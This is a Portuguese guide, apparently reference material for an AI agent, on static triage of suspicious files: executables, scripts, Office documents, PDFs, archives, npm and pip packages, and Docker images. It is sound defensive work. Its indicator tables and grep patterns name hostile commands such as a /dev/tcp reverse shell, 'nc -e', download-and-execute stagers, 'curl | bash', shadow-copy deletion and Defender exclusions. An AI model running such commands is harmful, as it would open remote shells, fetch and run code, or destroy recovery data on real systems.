# Análise Estática por Tipo de Artefato

Regra que vale para todos: **identifique pelo conteúdo, não pela extensão**, e **nunca execute**.

```bash
file -b arquivo            # tipo real
```

---

## PE / EXE / DLL (Windows)

Sem `capa`, `pefile` ou `Detect It Easy` instalados, a triagem é feita com Defender +
assinatura + strings. Se precisar ir mais fundo, proponha instalar `pefile` (`pip install pefile`)
— é puro Python e não executa a amostra.

```powershell
Get-FileHash arquivo.exe -Algorithm SHA256
Get-AuthenticodeSignature arquivo.exe | Format-List *
& "$env:ProgramFiles\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\caminho\arquivo.exe" -DisableRemediation
```

```bash
strings -n 8 arquivo.exe | sort -u > /tmp/s.txt
grep -inE 'http://|https://|\.onion|\.duckdns|\.ngrok|pastebin|discord.*api|t\.me/' /tmp/s.txt
grep -inE 'VirtualAlloc|WriteProcessMemory|CreateRemoteThread|NtUnmapViewOfSection|SetWindowsHookEx|GetAsyncKeyState|CryptEncrypt|WinHttpOpen|URLDownloadToFile' /tmp/s.txt
grep -inE 'schtasks|reg add|vssadmin|bcdedit|wbadmin|netsh advfirewall|Add-MpPreference' /tmp/s.txt
```

Leitura dos achados:
- **Poucas strings legíveis + alta entropia** = packed/criptografado. Não é prova de malware
  (UPX, VMProtect e Themida são comerciais), mas exige justificativa. Software legítimo
  packed geralmente é assinado.
- `VirtualAlloc` + `WriteProcessMemory` + `CreateRemoteThread` = injeção de processo
- `GetAsyncKeyState` / `SetWindowsHookEx` = keylogger
- `vssadmin delete shadows` / `bcdedit /set recoveryenabled no` = ransomware destruindo recuperação
- `Add-MpPreference -ExclusionPath` = tentando cegar o Defender
- Strings de carteira cripto, `wallet.dat`, `Local State`, `login.json`, caminhos de perfil
  de browser = infostealer
- URL de Discord/Telegram/Pastebin embutida = C2 barato, muito comum em stealer commodity

---

## Scripts (PS1, BAT, VBS, JS, PY, SH)

Leia como texto. Nunca execute, nunca `Invoke-Expression`, nunca `node -e`.

```powershell
Get-Content .\arquivo.ps1 -Raw -TotalCount 200
```

Padrões que exigem investigação:

| Padrão | O que significa |
|---|---|
| `powershell -enc <b64>` / `-EncodedCommand` | Comando escondido — decodifique (UTF-16LE) |
| `-w hidden -nop -ep bypass` | Execução escondida sem perfil/política — bandeira vermelha forte |
| `IEX (New-Object Net.WebClient).DownloadString(...)` | Stager: baixa e executa da rede |
| `iwr ... \| iex`, `curl ... \| bash` | Mesma coisa em outra sintaxe |
| `FromBase64String`, `atob(`, `Buffer.from(x,'base64')` | Payload codificado |
| `eval(`, `exec(`, `new Function(`, `child_process` | Execução dinâmica |
| `$env:TEMP`, `%APPDATA%`, `/tmp/.` + escrita | Dropper montando o estágio 2 |
| `schtasks /create`, `Run` key, `New-Service`, `crontab -`, `systemd` | Persistência |
| `bash -i >& /dev/tcp/IP/PORT 0>&1`, `nc -e` | Reverse shell |
| `[char]0x`, `-join`, `chr()`, concatenação de string quebrada | Ofuscação anti-detecção |
| `Add-MpPreference -ExclusionPath` | Desabilitando defesa |

Decodificação segura:

```powershell
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('BASE64'))
```

```bash
echo 'BASE64' | base64 -d | head -c 3000
python3 - <<'EOF'
import base64
print(base64.b64decode("BASE64").decode("utf-8","replace")[:3000])
EOF
```

Ou use `scripts/deobfuscate.py`, que resolve camadas encadeadas automaticamente.

---

## Office (DOCX, XLSX, DOC, XLSM)

Formatos `x` (docx/xlsx) são ZIP. Formatos legados (`doc`/`xls`) são OLE2 e mais perigosos.

**Macro só roda se o usuário clicar "Habilitar Conteúdo".** Nunca abra a amostra no Word/Excel.

```bash
file doc.docx                          # deve dizer "Microsoft Word 2007+" / Zip
unzip -l doc.docx                      # vbaProject.bin presente = tem macro
unzip -o doc.docx -d /tmp/doc && grep -rniE 'http|Target=' /tmp/doc/word/_rels/ | head
```

Sinais de alerta:
- `vbaProject.bin` num documento que não deveria ter macro
- `.docx` que na verdade é `.doc` renomeado (OLE2 disfarçado)
- Relationship com `TargetMode="External"` apontando pra URL — template injection / remote template
- Objeto OLE embutido, `oleObject*.bin`
- DDE / `DDEAUTO` no XML
- Documento que só contém "Habilite a edição para visualizar" — isca clássica

`oletools` (`pip install oletools`, `olevba arquivo.doc`) é a ferramenta certa aqui e não
executa a macro — proponha instalar quando o documento tiver `vbaProject.bin`.

---

## PDF

```bash
file doc.pdf
strings doc.pdf | grep -aiE '/JS|/JavaScript|/OpenAction|/AA|/Launch|/EmbeddedFile|/URI|/RichMedia|/SubmitForm' | head -30
strings doc.pdf | grep -aoE 'https?://[^ )>"]+' | sort -u | head -30
```

- `/OpenAction` + `/JS` = executa JavaScript ao abrir
- `/Launch` = tenta rodar programa externo
- `/EmbeddedFile` = arquivo anexado dentro do PDF
- PDF de 1 página, poucos KB, com uma URL grande = phishing puro, sem exploit
- Muito objeto `stream` com filtro incomum + PDF minúsculo = ofuscação

A grande maioria dos PDFs maliciosos hoje é phishing (link), não exploit. Avalie a URL
com `references/url-triage.md`.

---

## Arquivos compactados (ZIP, RAR, 7z, ISO, IMG)

**Liste antes de extrair. Extraia em pasta descartável e vazia.**

```bash
unzip -l arquivo.zip
7z l arquivo.7z 2>/dev/null
mkdir -p /tmp/insp && unzip -o arquivo.zip -d /tmp/insp && find /tmp/insp -type f -exec file {} \;
```

Sinais de alerta:
- ZIP protegido por senha com a senha no corpo do e-mail = evasão de scanner de gateway
- Um `.lnk`, `.js`, `.vbs`, `.cmd`, `.scr` ou `.iso` dentro de um "documento"
- `.iso`/`.img`/`.vhd` anexado a e-mail — usado pra burlar a marca MOTW do Windows
- Extensão dupla ou caractere RLO no nome interno
- Zip slip: caminho com `../` no nome da entrada
- Relação de compressão absurda (zip bomb)

`.lnk` merece leitura direta — o comando fica no arquivo:
```bash
strings -n 5 arquivo.lnk | grep -iE 'powershell|cmd|http|\.exe' | head
```

---

## Pacotes npm

Risco central: `preinstall`/`postinstall`/`prepare` executam código no `npm install`.
**Nunca instale para inspecionar.**

```bash
npm pack nome@versao          # baixa o tarball SEM executar scripts
tar -xzf nome-versao.tgz -C /tmp/insp
cd /tmp/insp/package
cat package.json              # olhe "scripts" primeiro
grep -rnE 'child_process|eval\(|Function\(|atob\(|https?://|process\.env' . | head -40
find . -type f \( -name '*.node' -o -name '*.wasm' -o -name '*.exe' \)
```

- Nome parecido com pacote popular (`crossenv` vs `cross-env`) = typosquatting
- Pacote publicado há dias com muitos downloads = suspeito
- `postinstall` que roda `curl`/`node -e`/base64 = quase sempre malicioso
- Leitura de `process.env` inteiro + envio pra rede = exfiltração de segredo de CI
- Binário `.node` sem código-fonte correspondente

## Pacotes pip

`setup.py` executa código no import e no install.

```bash
pip download --no-deps --no-binary :all: pacote -d /tmp/insp   # não executa setup.py
tar -xzf /tmp/insp/*.tar.gz -C /tmp/insp
grep -rnE 'os\.system|subprocess|exec\(|eval\(|urllib|requests\.(get|post)|base64' /tmp/insp --include='setup.py' --include='*.py' | head -30
```

Wheel (`.whl`) é ZIP e não roda `setup.py` — mas verifique `*.dist-info/RECORD` e
qualquer `.so`/`.pyd` embutido.

---

## Imagem Docker

```bash
docker pull imagem:tag                  # pull não executa nada
docker history --no-trunc imagem:tag    # cada camada e o comando que a criou
docker save imagem:tag -o /tmp/img.tar && tar -tf /tmp/img.tar | head
docker inspect imagem:tag --format '{{json .Config}}' | python3 -m json.tool
```

- `ENTRYPOINT`/`CMD` com `curl ... | sh`
- Camada que adiciona binário sem origem clara
- Segredo hardcoded em `ENV`
- Imagem baseada em tag mutável de conta desconhecida
- `USER root` sem necessidade + `--privileged` no compose

`trivy image imagem:tag` é o scanner certo — não está instalado aqui; proponha instalar.

---

## Sobre entropia e packing

Alta entropia (~7.5-8.0 bits/byte) significa dados comprimidos ou criptografados. Isso é
normal em: instaladores, arquivos de mídia, binários packed comerciais, blobs de recurso.
Só vira indicador quando **não há razão** pra aquele arquivo ser opaco — um `.js` de 40
linhas com um blob de alta entropia no meio, ou um `.exe` de utilitário simples sem
assinatura e sem strings legíveis.

Nunca conclua "malicioso porque tem entropia alta". Conclua "não consegui analisar o
conteúdo — UNKNOWN" e diga o que falta.
